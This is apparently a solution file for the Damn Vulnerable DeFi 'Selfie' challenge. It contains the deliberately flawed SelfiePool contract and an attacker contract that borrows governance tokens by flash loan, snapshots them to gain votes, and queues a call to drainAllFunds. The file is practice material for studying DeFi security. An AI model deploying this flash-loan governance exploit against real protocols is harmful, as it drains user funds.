// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {
    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(
            msg.sender == address(governance),
            "Only governance can execute this action"
        );
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token.transfer(msg.sender, borrowAmount);

        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );

        uint256 balanceAfter = token.balanceOf(address(this));

        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}

contract FuckTheGovernment {
    SelfiePool pool;
    SimpleGovernance gov;
    DamnValuableTokenSnapshot token;
    address owner;

    constructor(address _pool, address _gov) {
        owner = msg.sender;
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
    }

    function receiveTokens(address _token, uint256 _tokenAmount) external {
        token = DamnValuableTokenSnapshot(_token);
        token.snapshot();
        token.transfer(msg.sender, _tokenAmount);
    }

    function attack(uint256 _borrowAmount, address _receiver)
        external
        returns (uint256)
    {
        require(owner == msg.sender);
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            msg.sender
        );
        pool.flashLoan(_borrowAmount);
        return gov.queueAction(_receiver, data, 0);
    }
}
